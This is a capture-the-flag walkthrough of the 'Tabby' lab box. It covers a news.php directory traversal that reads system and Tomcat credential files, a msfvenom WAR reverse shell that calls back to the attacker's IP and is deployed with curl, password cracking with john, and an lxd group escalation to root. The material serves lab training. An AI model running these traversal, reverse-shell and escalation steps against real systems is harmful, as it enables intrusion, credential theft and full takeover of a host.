**Port 80:**

At first glance the website looks normal. The links are pretty standard for this kind of box, they dont really go anywhere.... Although we are left with an email. sales@megahosting.htb

![](/img/tabby/2020-12-09_03-57.png)

While checking links at megahosting.htb, I notice the NEWS tab in the navbar redirects to

[http:](http://megahosting.htb/news.php?file=statement)[_//megahosting.htb/news.php?file=statement_](http://megahosting.htb/news.php?file=statement)

![](/img/tabby/2020-12-09_04-27.png)

Looking at the link, it looks to me that it could be vulnerable to a directory traversal attack, lets try read /etc/passwd.

``` http://megahosting.htb/news.php?file=../../../../etc/passwd ```


![](/img/tabby/2020-12-09_04-30.png)

I can read etc/passwd. This has also led me to find a user named Ash.

This is happening because of this news.php and the file parameter it pertains to.

```news.php?file=statement```

The statement file is stored on the system in the location /var/www/files. When returning this file, the application appends the requested filename to this base directory and uses some API to read the contents of the file.

The system is tricked when given the correct sequence of ```../../../../ ```to get to /etc/passwd.

Time to move on, I want to see what this website is hiding.

I am going to start by running a dirb scan, also choosing option -r so I dont search every directory recursively

```dirb http://megahosting.htb/megahosting.htb -r```


![](/img/tabby/2020-12-09_04-59_1.png)

Initial directory scan does not give too much useful information, so I will run another scan, this time with gobuser and a different wordlist.

``` gobuster dir -u http://megahosting.htb -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt ```

![](/img/tabby/2020-12-09_05-10.png)

While that is running, I am going to run a http-enum nse script to see if I can find out anything else about what is happening on port 80.

``` nmap -sV -oN httpscan.txt --script=http-enum megahosting.htb ```

![](/img/tabby/2020-12-09_05-06.png)

Great, a number of interesting directories on 8080, that was my next move anyway.

**Port 8080:**

Running dirb on port 8080

```
dirb http://megahosting.htb:8080 -r
```

![](/img/tabby/2020-12-09_05-15.png)

/docs

Taking a look at these directories, it is clear the system is running Apache Tomcat 9.0.31, and we have access to all the documentation here.

![](/img/tabby/2020-12-09_05-18.png)

/examples

Looking at the example page, it is noted that the system has functionality to execute jsp files.

![](/img/tabby/2020-12-09_05-19.png)

/host-manager/html

The rest of the directories are all hitting 401 Unauthorized. Although these files aren&#39;t letting me in, they do in particular have some use. It is showing the default credentials for tomcat.

![](/img/tabby/2020-12-09_05-24.png)

**Initial Shell Vulnerability Exploited**

Okay with all this information there is a way in, I am going to use the directory traversal attack to read tomcat-users.xml.

Fire up burp and intercept the request to this URL

``` http://megahosting.htb/news.php?file=../../../../../../usr/share/tomcat9/etc/tomcat-users.xml ```


Forward the intercepted request to the repeater (Ctrl + R), Once the request has been sent in the repeater, as I can see I have successfully obtained admin credentials for the tomcat server.

![](/img/tabby/2020-12-09_06-31.png)

**Credentials**

**User:** tomcat

**Pass:** $3cureP4s5w0rd123!

On viewing the manager page on successful login, I am now greeted with 403, this version of tomcat has restrictions in place so it can only be viewed from a browser on the target system.

![](/img/tabby/2020-12-09_06-38.png)

I have decided to create a .war reverse shell using msfvenom, I have exploited a lower version of tomcat before, and this will come in useful later.

``` msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.60 LPORT=1234 -f war -o shell.war ```

Referencing the documentation has shown that it is possible to deploy a .war application remotely. I already have the credentials so lets give this a go.

[https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Deploy\_A\_New\_Application\_Archive\_(WAR)\_Remotely](https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Deploy_A_New_Application_Archive_(WAR)_Remotely)

``` curl -v -u 'tomcat:$3cureP4s5w0rd123!' -T shell.war &#39;http://tabby.htb:8080/manager/text/deploy?path=/shell&amp;update=true&#39; ```

![](/img/tabby/2020-12-09_07-26.png)

Time to get that reverse-shell, set up a nc listener.

``` nc -lnvp 1234 ```


Visiting [http://megahosting.htb:8080/shell/](http://megahosting.htb:8080/shell/)will trigger a reverse shell to my listener

![](/img/tabby/2020-12-09_07-32.png)

![](/img/tabby/2020-12-09_07-34.png)


The shell is pretty rubbish, i'm going to spend a little time getting some more functionality.

```
python3 -c 'import pty;pty.spawn("bash")'

tomcat@tabby:/var/lib/tomcat9$ ^Z
 [1]+ Stopped nc -lnvp 443
 
 kali@kali# stty raw -echo; fg
 
 nc -lnvp 443
    reset
 Terminal type? screen |
```

Now there is a nice shell!

![](/img/tabby/2020-12-09_07-46.png)

**Vulnerability Explanation:**

Directory Traversal / Service misconfiguration.

#### Privilege Escalation

Starting with my usual method of enumeration. I am going to open up a temporary webserver on my host so I can transfer files to the target.

``` sudo python -m SimpleHTTPServer 80 ```

![](/img/tabby/2020-12-09_07-51.png)

Now, I am going to download linpeas.sh on to the target using wget.

``` wget http://10.10.14.60/linpeas.sh ```

I am going to make the script executable and then run it.

![](/img/tabby/2020-12-09_07-54.png)

Navigating to /var/www/html/files shows some interesting files, primarily because there is a backup.zip here, and an inclination that it could have some good info inside, after all the other empty folders in /files look interesting enough.

As this is just in a public directory, I have just used my browser to download and I have checked the md5sum against the md5sum on the box.

![](/img/tabby/2020-12-09_08-19.png)

Turns out this is a password protected zip, time to crack.

First I need to send the zip file to zip2john so it is in a crackable format.

``` zip2john 16162020_backup.zip > backup.zip.john ```

Once that has completed it is time to crack the file using john &amp; rockyou...standard...

``` john backup.zip.john --wordlist=/usr/share/wordlists/rockyou.txt ```

![](/img/tabby/2020-12-09_08-26.png)

**Password:** admin@it

EVERYTHING IS EMPTY

Turns out user Ash just reuses his passwords…

``` su ash ```

![](/img/tabby/2020-12-09_08-29.png)

User.txt located

![](/img/tabby/2020-12-09_08-35.png)

The linpeas.sh script didn&#39;t really tell me anything interesting, although it did point out that ash in a member of the lxd group.

![](/img/tabby/2020-12-09_09-23.png)

We are going to create an image using the lxd-alpine-builder.

``` git clone https://github.com/saghul/lxd-alpine-builder.git ```

For this vulnerability to work, we have to do a few things as root on our host.

``` su root
cd lxd-alpine-builder/
./build-alpine 
```

![](/img/tabby/2020-12-09_09-31.png)

Once that has built, I want to transfer the file **alpine-v3.12-x86\64-20201209\0904.tar.gz** over to the target machine.

Setting up a webserver again to do this

``` python -m SimpleHTTPServer 800 ```

Moving back to the targets shell, using wget to download the file I just created as root on my host.

``` wget http://10.10.14.60:800/alpine-v3.12-x86_64-20201209_0904.tar.gz ```

![](/img/tabby/2020-12-09_09-34.png)

``` 
lxc image import /dev/shm/alpine-v3.12-x86\_64-20201209\_0904.tar.gz --alias ryku-image
lxc image list 
 ```

![](/img/tabby/2020-12-09_09-35.png)

```
 lxc init ryku-image ignite -c security.privileged=true
 lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
 lxc start ignite
 lxc exec ignite /bin/sh
 id 
 ```

![](/img/tabby/2020-12-09_09-42.png) ![](/img/tabby/2020-12-09_09-43.png)

We are root! In the container… I mounted my root file system though, so let's check that...

```
 cd /mnt/root
 ls
 cd /root 
 ```
```cat root.txt to obtain the flag```

![](/img/tabby/2020-12-09_09-43_1.png)

**Vulnerability Exploited:**

lxd-privilege-escalation

**Vulnerability Explanation:**

lxd which is a process run by root, this process is used to carry out certain actions for anyone with write access to the lxd socket. It doesn&#39;t usually check to see if the current user vs root user privs are matched, and will go ahead and execute anyway.
